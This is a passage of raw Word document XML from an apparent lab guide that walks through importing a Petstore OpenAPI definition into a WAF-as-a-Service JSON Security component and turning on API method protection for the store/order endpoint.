      <w:r w:rsidR="00F84B46">
        <w:t>please wait a few minutes and try again.</w:t>
      </w:r>
      <w:r w:rsidR="001C63F9">
        <w:t xml:space="preserve">  You should see the same </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="001C63F9">
        <w:t>Petstore</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="001C63F9">
        <w:t xml:space="preserve"> API application as you did before when you went directly to your web server </w:t>
      </w:r>
      <w:r w:rsidR="001C63F9">
        <w:rPr>
          <w:noProof/>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="574626F1" wp14:editId="6F2D69DB">
            <wp:extent cx="5082491" cy="95989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71">
                      <a:extLst>
                        <a:ext uri="{28A0092B-C50C-407E-A947-70E740481C1C}">
                          <a14:useLocalDpi xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main" val="0"/>
                        </a:ext>
                      </a:extLst>
                    </a:blip>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5082491" cy="959894"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="76305BD4" w14:textId="77777777" w:rsidR="00DF35BF" w:rsidRDefault="00DF35BF">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
          <w:color w:val="365F91" w:themeColor="accent1" w:themeShade="BF"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B8D1E6E" w14:textId="3F81EB65" w:rsidR="00F52385" w:rsidRDefault="00DF35BF" w:rsidP="00DF35BF">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="104" w:name="_Toc72791989"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Importing the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>OpenAPI</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> Definition</w:t>
      </w:r>
      <w:bookmarkEnd w:id="104"/>
    </w:p>
    <w:p w14:paraId="6E81BD6A" w14:textId="44ED67DB" w:rsidR="009B5E6E" w:rsidRDefault="00553A72" w:rsidP="00553A72">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">In your browser tab where you have the </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="007B3BC3" w:rsidRPr="0696E29C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>CNAME</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ,</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="003970BE">
        <w:t>right-</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">click on the link that ends with </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>openapi.json</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> as shown </w:t>
      </w:r>
      <w:r w:rsidR="003970BE">
        <w:t xml:space="preserve">and save the file to your computer as </w:t>
      </w:r>
      <w:r w:rsidR="003970BE" w:rsidRPr="0696E29C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="003970BE" w:rsidRPr="0696E29C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>openapi.json</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="003970BE">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="009B5E6E">
        <w:rPr>
          <w:noProof/>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3073FD2C" wp14:editId="5DF3D5A1">
            <wp:extent cx="3936670" cy="931411"/>
            <wp:effectExtent l="0" t="0" r="6985" b="2540"/>
            <wp:docPr id="1449851373" name="Picture 144985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73"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId72">
                      <a:extLst>
                        <a:ext uri="{28A0092B-C50C-407E-A947-70E740481C1C}">
                          <a14:useLocalDpi xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main" val="0"/>
                        </a:ext>
                      </a:extLst>
                    </a:blip>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="3936670" cy="931411"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:commentRangeStart w:id="105"/>
      <w:commentRangeEnd w:id="105"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:commentReference w:id="105"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="47A9A3E2" w14:textId="3860BCF4" w:rsidR="4809EE10" w:rsidRDefault="4809EE10" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Add the </w:t>
      </w:r>
      <w:r w:rsidRPr="0696E29C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">JSON </w:t>
      </w:r>
      <w:r w:rsidR="008A7E97" w:rsidRPr="0696E29C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Security</w:t>
      </w:r>
      <w:r w:rsidR="008A7E97">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Component</w:t>
      </w:r>
      <w:r w:rsidR="00126D03">
        <w:t xml:space="preserve"> by clicking on </w:t>
      </w:r>
      <w:r w:rsidR="00126D03" w:rsidRPr="0696E29C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Add Component</w:t>
      </w:r>
      <w:r w:rsidR="008A7E97" w:rsidRPr="0696E29C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidR="00B84017" w:rsidRPr="0696E29C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r w:rsidR="00617B76" w:rsidRPr="0696E29C">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00617B76">
        <w:rPr>
          <w:noProof/>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3979298E" wp14:editId="16DE893A">
            <wp:extent cx="973777" cy="2052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73">
                      <a:extLst>
                        <a:ext uri="{28A0092B-C50C-407E-A947-70E740481C1C}">
                          <a14:useLocalDpi xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main" val="0"/>
                        </a:ext>
                      </a:extLst>
                    </a:blip>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="973777" cy="205257"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="70857AE3" w14:textId="5164945E" w:rsidR="00126D03" w:rsidRDefault="4809EE10" w:rsidP="002D2B05">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Click </w:t>
      </w:r>
      <w:r w:rsidRPr="007D6471">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Import JSON Specs</w:t>
      </w:r>
      <w:r w:rsidR="007D6471">
        <w:t>, s</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">elect the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="007D6471">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>openapi.json</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> file</w:t>
      </w:r>
      <w:r w:rsidR="3770ADF8">
        <w:t xml:space="preserve"> that you have downloaded.</w:t>
      </w:r>
      <w:r w:rsidR="00126D03">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47307481" w14:textId="5B733B75" w:rsidR="07BCBFF0" w:rsidRDefault="00126D03" w:rsidP="002D2B05">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>WAF-as-a-Service imports the</w:t>
      </w:r>
      <w:r w:rsidR="007D6471">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="007D6471">
        <w:t>OpenAPI</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="007D6471">
        <w:t xml:space="preserve"> definition </w:t>
      </w:r>
      <w:r w:rsidR="00617B76">
        <w:t xml:space="preserve">as </w:t>
      </w:r>
      <w:r w:rsidR="003F67D6">
        <w:t xml:space="preserve">a </w:t>
      </w:r>
      <w:r w:rsidR="784614D6">
        <w:t xml:space="preserve">list of </w:t>
      </w:r>
      <w:r w:rsidR="003F67D6">
        <w:t>Profile</w:t>
      </w:r>
      <w:r w:rsidR="02FB8EC3">
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidR="003F67D6">
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r w:rsidR="6752674B">
        <w:t xml:space="preserve">a </w:t>
      </w:r>
      <w:r w:rsidR="003F67D6">
        <w:t>Policy</w:t>
      </w:r>
      <w:r w:rsidR="3F4A7879">
        <w:t>.</w:t>
      </w:r>
      <w:commentRangeStart w:id="107"/>
      <w:commentRangeEnd w:id="107"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:commentReference w:id="107"/>
      </w:r>
      <w:commentRangeStart w:id="109"/>
      <w:commentRangeEnd w:id="109"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:commentReference w:id="109"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="7509EFFA" w14:textId="60E29C7D" w:rsidR="5C205899" w:rsidRDefault="5C205899" w:rsidP="0696E29C">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="2"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="0696E29C">
        <w:t xml:space="preserve">A Profile is a </w:t>
      </w:r>
      <w:r w:rsidR="3F4A7879" w:rsidRPr="0696E29C">
        <w:t>JSON API endpoint with zero or more JSON Keys</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25C5C55B" w14:textId="2AB821C5" w:rsidR="48C61442" w:rsidRDefault="48C61442" w:rsidP="0696E29C">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="2"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="0696E29C">
        <w:t xml:space="preserve">A </w:t>
      </w:r>
      <w:r w:rsidR="3F4A7879" w:rsidRPr="0696E29C">
        <w:t>Polic</w:t>
      </w:r>
      <w:r w:rsidR="429561F8" w:rsidRPr="0696E29C">
        <w:t>y</w:t>
      </w:r>
      <w:r w:rsidR="3F4A7879" w:rsidRPr="0696E29C">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="4E2DC2D2" w:rsidRPr="0696E29C">
        <w:t xml:space="preserve">only </w:t>
      </w:r>
      <w:r w:rsidR="3F4A7879" w:rsidRPr="0696E29C">
        <w:t>contain</w:t>
      </w:r>
      <w:r w:rsidR="1FD6E56C" w:rsidRPr="0696E29C">
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidR="3F4A7879" w:rsidRPr="0696E29C">
        <w:t xml:space="preserve"> limits for JSON Keys</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04A090ED" w14:textId="5112A633" w:rsidR="007D6471" w:rsidRDefault="003F67D6" w:rsidP="003F67D6">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="31"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>In the Profile, e</w:t>
      </w:r>
      <w:r w:rsidR="00483CDE">
        <w:t xml:space="preserve">ach </w:t>
      </w:r>
      <w:r w:rsidR="008A0072">
        <w:t xml:space="preserve">API </w:t>
      </w:r>
      <w:r w:rsidR="00483CDE">
        <w:t xml:space="preserve">endpoint </w:t>
      </w:r>
      <w:r w:rsidR="323017F3">
        <w:t xml:space="preserve">and </w:t>
      </w:r>
      <w:r w:rsidR="008A0072">
        <w:t>JSON K</w:t>
      </w:r>
      <w:r w:rsidR="323017F3">
        <w:t xml:space="preserve">ey </w:t>
      </w:r>
      <w:r w:rsidR="008A0072">
        <w:t xml:space="preserve">has </w:t>
      </w:r>
      <w:r w:rsidR="323017F3">
        <w:t>settings that can be viewed and edited.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BDE1A49" w14:textId="3000349B" w:rsidR="00AF4F7C" w:rsidRDefault="0E0DCC0D" w:rsidP="007D6471">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="31"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Click the </w:t>
      </w:r>
      <w:r w:rsidR="46BAE384">
        <w:t>“</w:t>
      </w:r>
      <w:r w:rsidR="009833BC" w:rsidRPr="0696E29C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Pet</w:t>
      </w:r>
      <w:r w:rsidR="46BAE384">
        <w:t xml:space="preserve">” </w:t>
      </w:r>
      <w:r w:rsidR="00AE6F14" w:rsidRPr="0696E29C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>JSON E</w:t>
      </w:r>
      <w:r w:rsidR="46BAE384" w:rsidRPr="0696E29C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>ndpoint</w:t>
      </w:r>
      <w:r w:rsidR="0042F612">
        <w:t xml:space="preserve"> and click </w:t>
      </w:r>
      <w:r w:rsidR="46BAE384">
        <w:t xml:space="preserve">the </w:t>
      </w:r>
      <w:r w:rsidR="46BAE384" w:rsidRPr="0696E29C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r w:rsidRPr="0696E29C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">encil </w:t>
      </w:r>
      <w:r w:rsidR="13732E8B" w:rsidRPr="0696E29C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r w:rsidRPr="0696E29C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>con</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to view</w:t>
      </w:r>
      <w:r w:rsidR="1E8873C6">
        <w:t xml:space="preserve"> (not change)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> the </w:t>
      </w:r>
      <w:r w:rsidR="6ED8DAFD">
        <w:t>settings.</w:t>
      </w:r>
      <w:r w:rsidR="454D196D">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00AF4F7C">
        <w:rPr>
          <w:noProof/>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="37DB08E9" wp14:editId="27E48BAA">
            <wp:extent cx="1897564" cy="368135"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1449851375" name="Picture 144985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7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97564" cy="368135"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F580C03" w14:textId="1E68F725" w:rsidR="0E0DCC0D" w:rsidRDefault="407A274F" w:rsidP="000E7FF0">
      <w:pPr>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1A3BA0E4" wp14:editId="1075BEC3">
            <wp:extent cx="1569720" cy="1305585"/>
            <wp:effectExtent l="0" t="0" r="0" b="8890"/>
            <wp:docPr id="1780413030" name="Picture 178041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41303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69720" cy="1305585"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DB7F851" w14:textId="223F2CA9" w:rsidR="51BE1DC0" w:rsidRDefault="51BE1DC0" w:rsidP="007D6471">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="31"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>C</w:t>
      </w:r>
      <w:r w:rsidR="0E0DCC0D">
        <w:t>lick the “</w:t>
      </w:r>
      <w:r w:rsidR="00AE6F14" w:rsidRPr="00AE6F14">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>category</w:t>
      </w:r>
      <w:r w:rsidR="0E0DCC0D">
        <w:t xml:space="preserve">” </w:t>
      </w:r>
      <w:r w:rsidR="0E0DCC0D" w:rsidRPr="00AE6F14">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>JSON Key</w:t>
      </w:r>
      <w:r w:rsidR="362AD943">
        <w:t xml:space="preserve"> and click the </w:t>
      </w:r>
      <w:r w:rsidR="362AD943" w:rsidRPr="00AE6F14">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>pencil icon</w:t>
      </w:r>
      <w:r w:rsidR="362AD943">
        <w:t xml:space="preserve"> to view </w:t>
      </w:r>
      <w:r w:rsidR="741A3D4A">
        <w:t xml:space="preserve">(not change) </w:t>
      </w:r>
      <w:r w:rsidR="362AD943">
        <w:t>the settings.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15284407" w14:textId="145EDF58" w:rsidR="55E0BB2E" w:rsidRDefault="00AE6F14" w:rsidP="007461D9">
      <w:pPr>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3B425072" wp14:editId="58AD72C9">
            <wp:extent cx="2026184" cy="1710047"/>
            <wp:effectExtent l="0" t="0" r="0" b="5080"/>
            <wp:docPr id="1449851376" name="Picture 144985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85137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26184" cy="1710047"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="73E23AC8" w14:textId="4B262B5C" w:rsidR="008A0072" w:rsidRDefault="008A0072" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="110" w:name="_Toc72791990"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">API Method </w:t>
      </w:r>
      <w:r w:rsidR="00A072A1">
        <w:t>Protection</w:t>
      </w:r>
      <w:bookmarkEnd w:id="110"/>
    </w:p>
    <w:p w14:paraId="309D8C58" w14:textId="0A5C0E6B" w:rsidR="722C61D8" w:rsidRDefault="722C61D8" w:rsidP="00172641">
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>OpenAPI</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="4A4149B4">
        <w:t>specifica</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">tion defines </w:t>
      </w:r>
      <w:r w:rsidR="36858867">
        <w:t>the allowed</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> HTTP Methods</w:t>
      </w:r>
      <w:r w:rsidR="008A0072">
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:r w:rsidR="008C2437">
        <w:t>verbs) for</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> each API endpoint</w:t>
      </w:r>
      <w:r w:rsidR="0DB670CA">
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="00F81092">
        <w:t xml:space="preserve"> WAF-as-a-Service refers to API endpoints as JSON Profiles.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2998C25C" w14:textId="3804A4F6" w:rsidR="00393AB4" w:rsidRDefault="00393AB4" w:rsidP="00393AB4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">In the JSON Security component, click the </w:t>
      </w:r>
      <w:r w:rsidRPr="009F46F6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>pencil</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> next to </w:t>
      </w:r>
      <w:r w:rsidRPr="004B701A">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>store</w:t>
      </w:r>
      <w:r>
        <w:t>/</w:t>
      </w:r>
      <w:r w:rsidRPr="004B701A">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>order</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to edit the JSON Profile</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FA068AE" w14:textId="21C8A619" w:rsidR="00393AB4" w:rsidRDefault="00393AB4" w:rsidP="00393AB4">
      <w:pPr>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0A88CDD4" wp14:editId="6DE11A52">
            <wp:extent cx="3331070" cy="976669"/>
            <wp:effectExtent l="0" t="0" r="3175" b="0"/>
            <wp:docPr id="623780353" name="Picture 62378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53"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId77">
                      <a:extLst>
                        <a:ext uri="{28A0092B-C50C-407E-A947-70E740481C1C}">
                          <a14:useLocalDpi xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main" val="0"/>
                        </a:ext>
                      </a:extLst>
                    </a:blip>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="3331070" cy="976669"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="17DC91FC" w14:textId="77777777" w:rsidR="00393AB4" w:rsidRPr="0067128C" w:rsidRDefault="00393AB4" w:rsidP="00393AB4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Change the </w:t>
      </w:r>
      <w:r w:rsidRPr="001516C4">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>URL Match</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to </w:t>
      </w:r>
      <w:r w:rsidRPr="0067128C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0067128C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>api</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0067128C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>/v3/store/order</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10FB9583" w14:textId="77777777" w:rsidR="00E5206A" w:rsidRPr="00E5206A" w:rsidRDefault="00393AB4" w:rsidP="00393AB4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Turn </w:t>
      </w:r>
      <w:r w:rsidRPr="001516C4">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Block Attacks</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>O</w:t>
      </w:r>
      <w:r w:rsidRPr="0045117B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D13E906" w14:textId="104D6F3D" w:rsidR="00E5206A" w:rsidRPr="00E5206A" w:rsidRDefault="00E5206A" w:rsidP="00393AB4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Note the only Method allowed by the API spec is </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>POST</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03D941EC" w14:textId="1B43ACE5" w:rsidR="00393AB4" w:rsidRPr="0045117B" w:rsidRDefault="00E5206A" w:rsidP="00393AB4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>C</w:t>
      </w:r>
      <w:r w:rsidR="00393AB4">
        <w:t xml:space="preserve">lick </w:t>
      </w:r>
      <w:r w:rsidR="00393AB4" w:rsidRPr="0045117B">
